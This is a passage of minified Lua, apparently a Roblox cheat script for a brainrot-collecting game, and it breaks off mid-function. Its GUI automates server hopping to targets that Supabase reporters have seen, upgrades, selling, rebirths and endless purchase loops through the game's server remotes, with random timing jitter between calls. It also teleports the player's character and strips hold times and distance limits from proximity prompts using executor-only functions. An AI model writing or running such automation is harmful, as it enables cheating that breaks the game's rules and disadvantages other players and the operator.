v38:SaveConfiguration();end end);pcall(function() local v1820=game:GetService("CoreGui"):FindFirstChild("OxyoStopHopGui");if v1820 then v1820:Destroy();end end);v38:Notify({Title="⛔ Auto Hop",Content="Stopped.",Duration=3,Image=4483362458});end function v130() pcall(function() local v1821=game:GetService("CoreGui"):FindFirstChild("OxyoStopHopGui");if v1821 then v1821:Destroy();end end);local v1348=Instance.new("ScreenGui");v1348.Name="OxyoStopHopGui";v1348.ResetOnSpawn=false;v1348.ZIndexBehavior=Enum.ZIndexBehavior.Sibling;v1348.Parent=game:GetService("CoreGui");local v1354=Instance.new("TextButton");v1354.Size=UDim2.new(0,170,0,55);v1354.Position=UDim2.new(0.5, -85,1, -80);v1354.BackgroundColor3=Color3.fromRGB(200,40,40);v1354.TextColor3=Color3.fromRGB(255,255,255);v1354.Text="⛔ Stop Auto Hop";v1354.Font=Enum.Font.GothamBold;v1354.TextSize=15;v1354.Parent=v1348;Instance.new("UICorner",v1354).CornerRadius=UDim.new(0,10);v1354.MouseButton1Click:Connect(function() v1348:Destroy();v131();end);end v61:CreateButton({Name="⛔ Stop Auto Hop",Callback=function() v131();end});v61:CreateSection("🧬 Brainrot Hunt");v61:CreateParagraph({Title="How it works",Content="Watches Supabase reporters — the moment any server has your target brainrot, hops directly."});v61:CreateInput({Name="Brainrot Name",PlaceholderText="e.g. Chimpanzini, Titan...",RemoveTextAfterFocusLost=false,Callback=function(v1365) getgenv()._wwhBrName=(v1365 or ""):gsub("^%s+",""):gsub("%s+$","");end});v61:CreateDropdown({Name="Rarity",Options={"Any","Common","Rare","Epic","Legendary","Mythic","Secret","Celestial","Godly"},CurrentOption={"Any"},MultipleOptions=false,Callback=function(v1367) local v1368=((type(v1367)=="table") and v1367[1]) or v1367 ;getgenv()._wwhBrRarity=((v1368=="Any") and nil) or v1368 ;end});v61:CreateDropdown({Name="Mutation",Options={"Any","Gold","Emerald","Diamond","Bloodmoon","Rainbow","Cheese","Aqua"},CurrentOption={"Any"},MultipleOptions=false,Callback=function(v1370) local v1371=((type(v1370)=="table") and v1370[1]) or v1370 ;getgenv()._wwhBrMutation=((v1371=="Any") and nil) or v1371 ;end});v61:CreateDropdown({Name="Trait",Options={"Any","MoonGlow","Magma","Storm","Slime","Volcano","Shamrock","Ice"},CurrentOption={"Any"},MultipleOptions=false,Callback=function(v1373) local v1374=((type(v1373)=="table") and v1373[1]) or v1373 ;getgenv()._wwhBrTrait=((v1374=="Any") and nil) or v1374 ;end});_wwhBRRef=v61:CreateToggle({Name="⏳ Start Brainrot Hunt",CurrentValue=false,Flag="WWHBrainrot",Callback=function(v1376) if  not v1376 then getgenv().OxyoWWHBR=false;getgenv().OxyoWWHBRStop=true;if v46.wwhBRThread then pcall(task.cancel,v46.wwhBRThread);v46.wwhBRThread=nil;end v38:Notify({Title="⛔ Brainrot Hunt",Content="Stopped.",Duration=3,Image=4483362458});return;end if ( not getgenv()._wwhBrName or (getgenv()._wwhBrName=="")) then v38:Notify({Title="⚠️ Name Required",Content="Enter a brainrot name first!",Duration=4,Image=4483362458});pcall(function() _wwhBRRef:Set(false);end);return;end getgenv().OxyoWWHBR=true;getgenv().OxyoWWHBRStop=false;v72();v130();v46.wwhBRThread=task.spawn(function() v125("OxyoWWHBR","OxyoWWHBRStop");end);end});end)();getgenv().OxyoAutoSafe=true;v56:CreateSection("Auto Upgrade");v56:CreateToggle({Name="Auto Upgrade",CurrentValue=false,Flag="AutoUpgrade",Callback=function(v889) v51.upgradeEnabled=v889;if v889 then v51.upgradeThread=task.spawn(function() local v2063=nil;pcall(function() v2063=v4.Events.Upgrade;end);while v51.upgradeEnabled do pcall(function() local v2380=workspace:FindFirstChild("GameFolder");local v2381=v2380 and v2380:FindFirstChild("Plots") ;if  not v2381 then return;end for v2444,v2445 in pairs(v2381:GetChildren()) do local v2446=v2445:FindFirstChild("Brainrots");if  not v2446 then continue;end for v2501,v2502 in pairs(v2446:GetChildren()) do local v2503,v2504=pcall(function() return v2502:GetAttribute("Owner");end);if (v2503 and v2504 and (tostring(v2504)==tostring(v40.UserId))) then for v2574,v2575 in pairs(v2446:GetChildren()) do local v2576=tonumber(v2575.Name);if v2576 then pcall(function() v2063:InvokeServer(v2576);end);task.wait(0.08);end end break;end end end end);task.wait(2);end end);elseif v51.upgradeThread then pcall(task.cancel,v51.upgradeThread);v51.upgradeThread=nil;end end});v56:CreateSection("Auto Sell");v56:CreateSlider({Name="Sell Threshold",Range={5,50},Increment=5,Suffix="Brainrots",CurrentValue=50,Flag="SellThreshold",Callback=function(v891) v51.sellThreshold=v891;end});v56:CreateSlider({Name="Sell Every X Seconds  (0 = off)",Range={0,300},Increment=10,Suffix="sec",CurrentValue=0,Flag="SellTimerInterval",Callback=function(v893) v51.sellTimer=v893;end});v56:CreateToggle({Name="Auto Sell",CurrentValue=false,Flag="AutoSell",Callback=function(v895) v51.sellEnabled=v895;if v895 then v51.sellThread=task.spawn(function() local v2064=tick();while v51.sellEnabled do local v2252=v144();local v2253=tick() -v2064 ;local v2254=v2252>=v51.sellThreshold ;local v2255=(v51.sellTimer>0) and (v2253>=v51.sellTimer) and (v2252>0) ;if (v2254 or v2255) then if v146() then v2064=tick();v38:Notify({Title="Auto Sell",Content="Sold "   .. v2252   .. " Brainrots!" ,Duration=2,Image=4483362458});end task.wait(3);else task.wait(2);end end end);elseif v51.sellThread then pcall(task.cancel,v51.sellThread);v51.sellThread=nil;end end});v56:CreateButton({Name="Sell Now (Manual)",Callback=function() if v146() then v38:Notify({Title="Sold!",Content="All Brainrots sold successfully!",Duration=3,Image=4483362458});else v38:Notify({Title="Error",Content="Failed to sell — make sure the game is running.",Duration=4,Image=4483362458});end end});do do local v1380=v4:FindFirstChild("Events") and v4.Events:FindFirstChild("Rebirth") ;local function v1381() if  not v1380 then v1380=v4:FindFirstChild("Events") and v4.Events:FindFirstChild("Rebirth") ;end if  not v1380 then return false;end local v1824=pcall(function() v1380:InvokeServer("Rebirth");end);return v1824;end local function v1382() while v51.rebirthEnabled do task.wait(5);pcall(function() if v1381() then v38:Notify({Title="Rebirth Done!",Content="Rebirth successful!",Duration=5,Image=4483362458});task.wait(6);end end);end end v56:CreateSection("Auto Rebirth");v56:CreateToggle({Name="Auto Rebirth",CurrentValue=false,Flag="AutoRebirth",Callback=function(v1825) v51.rebirthEnabled=v1825;if v1825 then v51.rebirthThread=task.spawn(v1382);v38:Notify({Title="Auto Rebirth ON",Content="Watching requirements - will rebirth when ready.",Duration=4,Image=4483362458});elseif v51.rebirthThread then pcall(task.cancel,v51.rebirthThread);v51.rebirthThread=nil;end end});v56:CreateButton({Name="Rebirth Now (Manual)",Callback=function() task.spawn(function() pcall(function() local v2258=v40:FindFirstChild("PlayerGui");local v2259=v2258 and v2258:FindFirstChild("HUD") ;local v2260=v2259 and v2259:FindFirstChild("LeftButtons") and v2259.LeftButtons:FindFirstChild("Rebirth") ;if v2260 then v2260.MouseButton1Click:Fire();end end);task.wait(0.3);if v1381() then v38:Notify({Title="Rebirth Done!",Content="Success!",Duration=4,Image=4483362458});else v38:Notify({Title="Rebirth Failed",Content="Server rejected rebirth.",Duration=4,Image=4483362458});end end);end});end local v897=v58:CreateParagraph({Title="Brainrots in World",Content="Scanning..."});v58:CreateSection("Live Brainrot Status");task.spawn(function() local v1383= -1;task.wait(1);while true do task.wait(3);pcall(function() local v2065=v50.brainrots;local v2066=0;for v2261,v2262 in ipairs(v2065) do if (v2262.obj and v2262.obj.Parent) then v2066+=1 end end if (v2066==v1383) then return;end v1383=v2066;if (v2066==0) then pcall(function() v897:Set({Title="Brainrots in World (0)",Content="No Brainrots in world right now."});end);return;end local v2067={};for v2263,v2264 in ipairs(v2065) do if (v2264.obj and v2264.obj.Parent) then local v2448="";local v2449=v46.traitData[v2264.obj];if (v2449 and ( #v2449.traitNames>0)) then v2448=" [TRAIT: "   .. table.concat(v2449.traitNames,"+")   .. "]" ;end table.insert(v2067,"["   .. (v2264.rarity or "?")   .. "] "   .. (v2264.name or "?")   .. " — "   .. (v2264.mutation or "Normal")   .. v2448 );end end pcall(function() v897:Set({Title="Brainrots in World ("   ..  #v2067   .. ")" ,Content=(( #v2067>0) and table.concat(v2067,"\n")) or "Nothing right now." });end);end);end end);end v58:CreateSection("Mutation Alert");v58:CreateDropdown({Name="Alert for Mutations",Options=v54,CurrentOption={},MultipleOptions=true,Flag="MutationAlertDropdown",Callback=function(v898) v46.mutationAlertDropdown=v898;end});v58:CreateToggle({Name="Mutation Alert",CurrentValue=false,Flag="MutationAlert",Callback=function(v900) v51.alertEnabled=v900;if v900 then local v1827={};v51.alertThread=task.spawn(function() while v51.alertEnabled do pcall(function() for v2450,v2451 in ipairs(v50.mutations) do if (v2451.obj and v2451.obj.Parent) then local v2534={};for v2562,v2563 in ipairs(v46.mutationAlertDropdown) do v2534[v2563]=true;end local v2535=( #v46.mutationAlertDropdown==0) or v2534[v2451.mutation] ;local v2536=v2451.name   .. "_"   .. v2451.mutation   .. "_"   .. v2451.rarity ;if (v2535 and  not v1827[v2536]) then v1827[v2536]=true;v38:Notify({Title="Mutation Detected!",Content="["   .. v2451.mutation   .. "] "   .. v2451.name   .. "\nZone: "   .. v2451.rarity ,Duration=6,Image=4483362458});end end end local v2382={};for v2452,v2453 in ipairs(v50.mutations) do v2382[v2453.name   .. "_"   .. v2453.mutation   .. "_"   .. v2453.rarity ]=true;end for v2455 in pairs(v1827) do if  not v2382[v2455] then v1827[v2455]=nil;end end end);task.wait(2);end end);elseif v51.alertThread then pcall(task.cancel,v51.alertThread);v51.alertThread=nil;end end});v59:CreateSection("Live Status");do local v902=v59:CreateParagraph({Title="Lucky Block Status",Content="Scanning..."});task.spawn(function() task.wait(2);while true do task.wait(3);pcall(function() local v2068=v149();local v2069={};local v2070={};for v2266,v2267 in ipairs(v2068) do local v2268=tostring(v2267.name or "?" );if v2267.active then table.insert(v2069,"✅ "   .. v2268   .. "  ("   .. math.floor(v2267.pos.X)   .. ", "   .. math.floor(v2267.pos.Y)   .. ", "   .. math.floor(v2267.pos.Z)   .. ")" );else table.insert(v2070,"⏳ "   .. v2268   .. " — Respawning..." );end end local v2071= #v2068;local v2072= #v2069;local v2073="Active: "   .. v2072   .. " / "   .. v2071   .. "\n\n"   .. table.concat(v2069,"\n")   .. ((( #v2070>0) and ("\n\n"   .. table.concat(v2070,"\n"))) or "") ;pcall(function() v902:Set({Title="Lucky Block Status ("   .. v2072   .. "/"   .. v2071   .. ")" ,Content=v2073});end);end);end end);end v60:CreateSection("Speed Upgrade");v60:CreateButton({Name="+1 Speed",Callback=function() local v903,v904=pcall(function() return v4.Events.Speed:InvokeServer("Speed",1);end);if ( not v903 or ((type(v904)=="string") and v904:lower():find("enough"))) then v38:Notify({Title="Not Enough Cash",Content="You don't have enough cash for +1 Speed.",Duration=4,Image=4483362458});else v38:Notify({Title="Upgraded!",Content="+1 Speed purchased!",Duration=3,Image=4483362458});end end});v60:CreateButton({Name="+5 Speed",Callback=function() local v905,v906=pcall(function() return v4.Events.Speed:InvokeServer("Speed",5);end);if ( not v905 or ((type(v906)=="string") and v906:lower():find("enough"))) then v38:Notify({Title="Not Enough Cash",Content="You don't have enough cash for +5 Speed.",Duration=4,Image=4483362458});else v38:Notify({Title="Upgraded!",Content="+5 Speed purchased!",Duration=3,Image=4483362458});end end});v60:CreateButton({Name="+10 Speed",Callback=function() local v907,v908=pcall(function() return v4.Events.Speed:InvokeServer("Speed",10);end);if ( not v907 or ((type(v908)=="string") and v908:lower():find("enough"))) then v38:Notify({Title="Not Enough Cash",Content="You don't have enough cash for +10 Speed.",Duration=4,Image=4483362458});else v38:Notify({Title="Upgraded!",Content="+10 Speed purchased!",Duration=3,Image=4483362458});end end});v60:CreateSection("Carry Upgrade");v60:CreateButton({Name="+1 Carry",Callback=function() local v909,v910=pcall(function() return v4.Events.Carry:InvokeServer("Carry");end);if ( not v909 or ((type(v910)=="string") and v910:lower():find("enough"))) then v38:Notify({Title="Not Enough Cash",Content="You don't have enough cash for +1 Carry.",Duration=4,Image=4483362458});else v38:Notify({Title="Upgraded!",Content="+1 Carry purchased!",Duration=3,Image=4483362458});end end});v60:CreateSection("Buy Gear");local function v565(v911) if  not v911 then return nil;end for v1384,v1385 in pairs(v52) do if (v1385.displayName==v911) then return v1384;end end local v912=v911:lower();for v1386,v1387 in pairs(v52) do if (v1387.displayName:lower()==v912) then return v1386;end end return nil;end do local v913={};for v1388,v1389 in pairs(v52) do if (v1388:sub(1,3)~="LB_") then table.insert(v913,v1389.displayName);end end table.sort(v913);v60:CreateDropdown({Name="Select Gear",Options=v913,CurrentOption={},MultipleOptions=true,Flag="GearMultiDropdown",Callback=function(v1390) v46.selectedGears={};v46.selectedGear=nil;local v1393=((type(v1390)=="table") and v1390) or {v1390} ;for v1829,v1830 in ipairs(v1393) do local v1831=v565(v1830);if v1831 then table.insert(v46.selectedGears,v1831);if  not v46.selectedGear then v46.selectedGear=v1831;end end end end});end v60:CreateButton({Name="Buy Selected Gear",Callback=function() if  not v46.selectedGear then v38:Notify({Title="Gear Shop",Content="Select a gear from the list first!",Duration=3,Image=4483362458});return;end task.spawn(function() local v1394=v52[v46.selectedGear];local v1395=v168(v46.selectedGear);if (v1395==v153.SUCCESS) then v38:Notify({Title="✅ Purchased!",Content=v1394.displayName   .. " bought!" ,Duration=4,Image=4483362458});elseif (v1395==v153.OUT_OF_STOCK) then v38:Notify({Title="Out of Stock",Content=v1394.displayName   .. " is currently out of stock." ,Duration=4,Image=4483362458});elseif (v1395==v153.NO_COINS) then v38:Notify({Title="Not Enough Coins",Content="Need "   .. v1394.coinPrice   .. " coins for "   .. v1394.displayName ,Duration=4,Image=4483362458});elseif (v1395==v153.NOT_IN_SHOP) then v38:Notify({Title="Not in Shop",Content=v1394.displayName   .. " is not available right now." ,Duration=4,Image=4483362458});end end);end});(function() v60:CreateSection("Buy Lucky Block");do local v1396={"Common Lucky Block","Rare Lucky Block","Epic Lucky Block","Legendary Lucky Block","Mythic Lucky Block","Secret Lucky Block","Celestial Lucky Block","Godly Lucky Block"};local v1397={["Common Lucky Block"]="LB_Common",["Rare Lucky Block"]="LB_Rare",["Epic Lucky Block"]="LB_Epic",["Legendary Lucky Block"]="LB_Legendary",["Mythic Lucky Block"]="LB_Mythic",["Secret Lucky Block"]="LB_Secret",["Celestial Lucky Block"]="LB_Celestial",["Godly Lucky Block"]="LB_Godly"};v60:CreateDropdown({Name="Select Lucky Block",Options=v1396,CurrentOption={},MultipleOptions=true,Flag="LBMultiDropdown",Callback=function(v1832) v46.selectedLBs={};local v1834=((type(v1832)=="table") and v1832) or {v1832} ;for v2074,v2075 in ipairs(v1834) do local v2076=v1397[v2075];if v2076 then table.insert(v46.selectedLBs,v2076);end end getgenv().OxyoSelectedLBs=v46.selectedLBs;end});end v60:CreateButton({Name="Buy Selected Lucky Block",Callback=function() if ( not v46.selectedLBs or ( #v46.selectedLBs==0)) then v38:Notify({Title="Lucky Block",Content="Select at least one Lucky Block first!",Duration=3,Image=4483362458});return;end task.spawn(function() for v2077,v2078 in ipairs(v46.selectedLBs) do local v2079=v52[v2078];if  not v2079 then continue;end local v2080=v168(v2078);if (v2080==v153.SUCCESS) then v38:Notify({Title="✅ Purchased!",Content=v2079.displayName   .. " bought!" ,Duration=4,Image=4483362458});elseif (v2080==v153.OUT_OF_STOCK) then v38:Notify({Title="Out of Stock",Content=v2079.displayName   .. " is out of stock." ,Duration=4,Image=4483362458});elseif (v2080==v153.NO_COINS) then v38:Notify({Title="Not Enough Coins",Content="Not enough coins for "   .. v2079.displayName ,Duration=4,Image=4483362458});elseif (v2080==v153.NOT_IN_SHOP) then v38:Notify({Title="Not in Shop",Content=v2079.displayName   .. " not available." ,Duration=4,Image=4483362458});end task.wait(0.5);end end);end});end)();(function() v60:CreateSection("Auto Buy Lucky Block");local v914=v60:CreateParagraph({Title="📊 Auto Buy LB Stats",Content="Idle"});local v915={total=0,attempts=0,startTick=0};local v916={};local function v917(v1398,v1399,v1400) local v1401=tick();local v1402=v916[v1398] or 0 ;if ((v1401-v1402)<30) then return;end v916[v1398]=v1401;pcall(function() v38:Notify({Title=v1399,Content=v1400,Duration=3,Image=4483362458});end);end local function v918() if  not v51.buyLBEnabled then return;end pcall(function() local v1836=tick() -v915.startTick ;local v1837=math.floor(v1836/60 );local v1838=math.floor(v1836%60 );local v1839={};for v2081,v2082 in ipairs(v46.selectedLBs or {} ) do local v2083=v52[v2082];if v2083 then table.insert(v1839,v2083.displayName:gsub(" Lucky Block",""):gsub(" %(World%)",""));end end v914:Set({Title="📊 Auto Buy LB — "   .. (((table.concat(v1839,", ")~="") and table.concat(v1839,", ")) or "—") ,Content=string.format("✅ Bought: %d  •  🔄 Attempts: %d\n⏱ Running: %02d:%02d",v915.total,v915.attempts,v1837,v1838)});end);end local function v919() pcall(function() local v1840=v38.Flags and v38.Flags['AutoBuyLB'] ;if v1840 then v1840:Set(false);end end);end local function v920() if (v154 and v154.Parent) then return true;end local v1404,v1405=pcall(function() return v4:WaitForChild("Events",3):WaitForChild("VendorPurchase",3);end);if (v1404 and v1405) then v154=v1405;return true;end return false;end local function v921() local v1406=tick() + 20 ;while v51.buyLBEnabled and (tick()<v1406)  do local v1841=v46.selectedLBs;if (v1841 and ( #v1841>0)) then break;end if (getgenv().OxyoSelectedLBs and ( #getgenv().OxyoSelectedLBs>0)) then v46.selectedLBs=getgenv().OxyoSelectedLBs;break;end task.wait(0.3);end if ( not v46.selectedLBs or ( #v46.selectedLBs==0)) then v38:Notify({Title="Auto Buy LB",Content="Select at least one Lucky Block first!",Duration=3,Image=4483362458});v51.buyLBEnabled=false;v919();return;end local v1407={};for v1842,v1843 in ipairs(v46.selectedLBs) do local v1844=v52[v1843];if v1844 then table.insert(v1407,v1844.displayName);end end v38:Notify({Title="🌙 LB Auto Buy Active",Content=table.concat(v1407,", ")   .. "\nRuns forever — toggle OFF to stop." ,Duration=4,Image=4483362458});while v51.buyLBEnabled do v915.attempts+=1 if  not v920() then task.wait(3);continue;end if (( not v46.selectedLBs or ( #v46.selectedLBs==0)) and getgenv().OxyoSelectedLBs and ( #getgenv().OxyoSelectedLBs>0)) then v46.selectedLBs=getgenv().OxyoSelectedLBs;end local v1845=(v46.selectedLBs and ( #v46.selectedLBs>0) and v46.selectedLBs) or {} ;if ( #v1845==0) then task.wait(2);continue;end local v1846=tick() + 10 ;while tick()<v1846  do local v2085=v0.LocalPlayer.Character;local v2086=v2085 and v2085:FindFirstChildOfClass("Humanoid") ;if (v2086 and (v2086.Health>0)) then break;end task.wait(0.5);end for v2087,v2088 in ipairs(v1845) do if  not v51.buyLBEnabled then break;end local v2089=v52[v2088];if  not v2089 then continue;end local v2090;pcall(function() v2090=v168(v2088);end);v2090=v2090 or v153.NOT_IN_SHOP ;if (v2090==v153.SUCCESS) then v915.total+=1 v917("success","✅ LB Purchased!",v2089.displayName   .. " — "   .. v915.total   .. " bought" );elseif (v2090==v153.OUT_OF_STOCK) then v917("oos","⏳ LB Out of Stock",v2089.displayName);elseif (v2090==v153.NO_COINS) then v917("coins","💰 No Coins","Not enough coins for "   .. v2089.displayName );end task.wait(0.5);end v918();local v1847=(math.random(0,600)/1000) -0.3 ;task.wait(2 + v1847 );end end v60:CreateToggle({Name="Auto Buy Lucky Block",CurrentValue=false,Flag="AutoBuyLB",Callback=function(v1408) v51.buyLBEnabled=v1408;if v1408 then getgenv().OxyoAutoBuyLB=true;end if v1408 then if (( not v46.selectedLBs or ( #v46.selectedLBs==0)) and getgenv().OxyoSelectedLBs and ( #getgenv().OxyoSelectedLBs>0)) then v46.selectedLBs=getgenv().OxyoSelectedLBs;end v915={total=0,attempts=0,startTick=tick()};v916={};v51.buyLBThread=task.spawn(v921);task.spawn(function() task.wait(15);while v51.buyLBEnabled do task.wait(10);if (v51.buyLBEnabled and (v51.buyLBThread==nil)) then v51.buyLBThread=task.spawn(v921);end end end);else if v51.buyLBThread then pcall(task.cancel,v51.buyLBThread);v51.buyLBThread=nil;end if (v915.startTick>0) then getgenv().OxyoAutoBuyLB=false;pcall(function() v914:Set({Title="📊 Auto Buy LB — Stopped",Content=string.format("Session ended.\n✅ Bought: %d  •  🔄 Attempts: %d",v915.total,v915.attempts)});end);v38:Notify({Title="Auto Buy LB Stopped",Content=string.format("Bought %d Lucky Blocks this session",v915.total),Duration=5,Image=4483362458});end end end});end)();(function() v60:CreateSection("Auto Buy");v60:CreateParagraph({Title="Auto Buy — Night Farm Mode",Content="Buys the selected gear every ~2s forever.\n✅ Continues buying after success\n⏳ Out of Stock → retries in 2s\n💰 No Coins → retries in 2s\n💀 Respawn-safe · 🌙 Night Farm ready\nToggle OFF to stop."});local v922=function() pcall(function() local v1848=v38.Flags and v38.Flags['AutoBuyGear'] ;if v1848 then v1848:Set(false);end end);end;local v923=v60:CreateParagraph({Title="📊 Auto Buy Stats",Content="Idle"});local v924={total=0,spent=0,attempts=0,startTick=0};local function v925() if  not v51.buyEnabled then return;end pcall(function() local v1849=tick() -v924.startTick ;local v1850=math.floor(v1849/60 );local v1851=math.floor(v1849%60 );local v1852=v46.selectedGear and v52[v46.selectedGear] ;local v1853=(v1852 and v1852.displayName) or "—" ;v923:Set({Title="📊 Auto Buy — "   .. v1853 ,Content=string.format("✅ Bought: %d  •  💰 Spent: ~%d coins\n🔄 Attempts: %d  •  ⏱ Running: %02d:%02d",v924.total,v924.spent,v924.attempts,v1850,v1851)});end);end local v926={};local function v927(v1410,v1411,v1412) local v1413=tick();local v1414=v926[v1410] or 0 ;if ((v1413-v1414)<30) then return;end v926[v1410]=v1413;pcall(function() v38:Notify({Title=v1411,Content=v1412,Duration=3,Image=4483362458});end);end local function v928() if (v154 and v154.Parent) then return true;end local v1416,v1417=pcall(function() return v4:WaitForChild("Events",3):WaitForChild("VendorPurchase",3);end);if (v1416 and v1417) then v154=v1417;return true;end return false;end local function v929() while v51.buyEnabled do v924.attempts+=1 if  not v928() then v927("no_remote","⚠️ Remote Missing","VendorPurchase not found — waiting...");task.wait(5);continue;end local v1854=tick() + 10 ;while tick()<v1854  do local v2093=v0.LocalPlayer.Character;local v2094=v2093 and v2093:FindFirstChildOfClass("Humanoid") ;if (v2094 and (v2094.Health>0)) then break;end task.wait(0.5);end local v1855={};if (v46.selectedGears and ( #v46.selectedGears>0)) then v1855=v46.selectedGears;elseif v46.selectedGear then v1855={v46.selectedGear};end if ( #v1855==0) then task.wait(2);continue;end for v2095,v2096 in ipairs(v1855) do if  not v51.buyEnabled then break;end local v2097=v52[v2096];if  not v2097 then continue;end local v2098;pcall(function() v2098=v168(v2096);end);v2098=v2098 or v153.NOT_IN_SHOP ;if (v2098==v153.SUCCESS) then(v924.total+=1)(v924.spent+=v2097.coinPrice ) or 0 v927("success","✅ Purchased!",v2097.displayName   .. " — "   .. v924.total   .. " bought this session" );elseif (v2098==v153.OUT_OF_STOCK) then local v2506=v162();local v2507=(v2506 and string.format(" (restock in %02d:%02d)",math.floor(v2506/60 ),v2506%60 )) or "" ;v927("oos","⏳ Out of Stock",v2097.displayName   .. v2507 );task.delay(3,function() if  not v51.buyEnabled then return;end local v2538=v158(v2097.displayName);local v2539=v158(v2097.serverKey);local v2540={};for v2565,v2566 in pairs(v156) do if (v2566.manual and  not v2566.inStock) then local v2581=v158(v2565);if ((v2581==v2538) or (v2581==v2539) or v2581:find(v2539,1,true) or v2539:find(v2581,1,true)) then table.insert(v2540,v2565);end end end for v2567,v2568 in ipairs(v2540) do v156[v2568]=nil;end end);elseif (v2098==v153.NO_COINS) then v927("coins","💰 Not Enough Coins","Need "   .. (v2097.coinPrice or 0)   .. " coins for "   .. v2097.displayName );elseif (v2098==v153.NOT_IN_SHOP) then v159(v2097.displayName,true,1,false);end task.wait(0.5);end v925();local v1856=(math.random(0,600)/1000) -0.3 ;task.wait(2 + v1856 );end end v60:CreateToggle({Name="Auto Buy",CurrentValue=false,Flag="AutoBuyGear",Callback=function(v1418) v51.buyEnabled=v1418;if v1418 then if (( #v46.selectedGears==0) and  not v46.selectedGear) then v38:Notify({Title="Auto Buy",Content="Select a gear from the list first!",Duration=3,Image=4483362458});v51.buyEnabled=false;v922();return;end if ( not v46.selectedGear and ( #v46.selectedGears>0)) then v46.selectedGear=v46.selectedGears[1];end local v2099=v52[v46.selectedGear];v924={total=0,spent=0,attempts=0,startTick=tick()};v926={};v38:Notify({Title="🌙 Night Farm Active",Content="Auto buying: "   .. v2099.displayName   .. "\nRuns forever — toggle OFF to stop." ,Duration=4,Image=4483362458});v51.buyThread=task.spawn(v929);task.spawn(function() task.wait(15);while v51.buyEnabled do task.wait(10);if (v51.buyEnabled and (v51.buyThread==nil)) then v38:Notify({Title="⚠️ Auto Buy",Content="Thread recovered — restarting.",Duration=3,Image=4483362458});v51.buyThread=task.spawn(v929);end end end);else if v51.buyThread then pcall(task.cancel,v51.buyThread);v51.buyThread=nil;end local v2101=v46.selectedGear and v52[v46.selectedGear] ;local v2102=(v2101 and v2101.displayName) or "Gear" ;pcall(function() v923:Set({Title="📊 Auto Buy — Stopped",Content=string.format("Session ended.\n✅ Bought: %d %s  •  💰 Spent: ~%d coins\n🔄 Total Attempts: %d",v924.total,v2102,v924.spent,v924.attempts)});end);v38:Notify({Title="Auto Buy Stopped",Content=string.format("Bought %d × %s  •  ~%d coins spent",v924.total,v2102,v924.spent),Duration=5,Image=4483362458});end end});end)();local function v566() local v930=workspace:FindFirstChild("GameFolder") and workspace.GameFolder:FindFirstChild("VolcanoObby") ;local v931=v930 and v930:FindFirstChild("DinoRender") ;if  not v931 then return nil,nil;end for v1420,v1421 in pairs(v931:GetChildren()) do if v1421:IsA("Model") then local v2103=v1421:GetAttribute("Name");local v2104=v1421:GetAttribute("Mutation") or "Normal" ;if (v2103 and (v2103~="")) then return v2103,v2104;end end end return nil,nil;end local function v567(v932,v933) for v1422,v1423 in ipairs(v47) do local v1424=v30(v1423);if v1424 then for v2274,v2275 in pairs(v1424:GetChildren()) do if (v2275 and v2275.Parent) then local v2457=v2275:GetAttribute("Name") or "" ;local v2458=v2275:GetAttribute("DisplayName") or "" ;local v2459=v2275:GetAttribute("Mutation") or "Normal" ;if (((v2457==v932) or (v2458==v932)) and (v2459==v933)) then return v2275;end end end end end return nil;end local v568=Vector3.new( -31.77319,4.259904, -56.313618);local function v569() local v934=v40.Character and v40.Character:FindFirstChild("HumanoidRootPart") ;if  not v934 then return;end local v935=workspace:FindFirstChild("GameFolder") and workspace.GameFolder:FindFirstChild("VolcanoObby") ;local v936=v935 and v935:FindFirstChild("TralaleroDinosauro") ;local v937=v936 and v936:FindFirstChild("RootPart") ;local v938=v937 and v937:FindFirstChild("UIAttachment") ;local v939=v938 and v938:FindFirstChildWhichIsA("ProximityPrompt") ;local v940=v2:Create(v934,TweenInfo.new(1.2,Enum.EasingStyle.Linear),{CFrame=CFrame.new(v568)});v940:Play();v940.Completed:Wait();v67(5,3);if v937 then local v1857=v2:Create(v934,TweenInfo.new(0.5,Enum.EasingStyle.Linear),{CFrame=CFrame.new(v937.Position + Vector3.new(0,4,0) )});v1857:Play();v1857.Completed:Wait();end task.wait(0.5);if v939 then v16(v939);task.wait(0.3);end local v941=game:GetService("ReplicatedStorage"):FindFirstChild("Remotes");v941=v941 and v941:FindFirstChild("VolcanoObby") ;v941=v941 and v941:FindFirstChild("SubmitBrainrot") ;if v941 then pcall(function() v941:FireServer();end);end task.wait(0.5);end(function() local function v942() local v1425,v1426={},{};for v1858,v1859 in ipairs(workspace:GetDescendants()) do if  not (v1859 and v1859.Parent) then continue;end local v1860=v1859.Name:lower();if  not (v1860:find("fragment") or (v1860=="frag")) then continue;end if  not (v1859:IsA("BasePart") or v1859:IsA("Model")) then continue;end local v1861=false;local v1862=v1859.Parent;while v1862 and (v1862~=workspace)  do if v1426[v1862] then v1861=true;break;end v1862=v1862.Parent;end if  not v1861 then v1426[v1859]=true;table.insert(v1425,v1859);end end return v1425;end local function v943(v1427) if ( not v1427 or  not v1427.Parent) then return false;end local v1428=v40.Character and v40.Character:FindFirstChild("HumanoidRootPart") ;if  not v1428 then return false;end local v1429=(v1427:IsA("BasePart") and v1427) or v1427.PrimaryPart or v1427:FindFirstChildWhichIsA("BasePart") ;if  not v1429 then return false;end v68(v1429.CFrame * CFrame.new(0,4,0) );task.wait(0.15);v1428=v40.Character and v40.Character:FindFirstChild("HumanoidRootPart") ;if  not v1428 then return false;end pcall(function() v1428.CFrame=CFrame.new(v1429.Position + Vector3.new(0,3,0) );end);task.wait(0.2);local v1430=(v1427:IsA("BasePart") and {v1427}) or v1427:GetDescendants() ;for v1864,v1865 in ipairs(v1430) do if v1865:IsA("BasePart") then v17(v1428,v1865,0);task.wait(0.05);end end local v1431=(v1427:IsA("Model") and v1427:GetDescendants()) or {v1427} ;for v1866,v1867 in ipairs(v1431) do if v1867:IsA("ProximityPrompt") then local v2277=v1867;local v2278=v2277.HoldDuration;pcall(function() v2277.HoldDuration=0;end);pcall(function() v2277.MaxActivationDistance=999;end);local v2279=(typeof(fireproximityprompt)=="function") and pcall(fireproximityprompt,v2277) ;if  not v2279 then v2279=pcall(function() game:GetService("ProximityPromptService"):PromptTriggered(v2277,v40);end);end if  not v2279 then pcall(function() local v2509=v4:FindFirstChild("Events");local v2510=v2509 and (v2509:FindFirstChild("Interact") or v2509:FindFirstChild("ProximityPrompt") or v2509:FindFirstChild("Trigger") or v2509:FindFirstChild("PickUp") or v2509:FindFirstChild("Collect")) ;if v2510 then v2510:FireServer(v2277);v2279=true;end end);end if  not v2279 then v17(v1428,v1429,0);task.wait(0.05);end task.wait(0.15);pcall(function() v2277.HoldDuration=v2278;end);pcall(function() 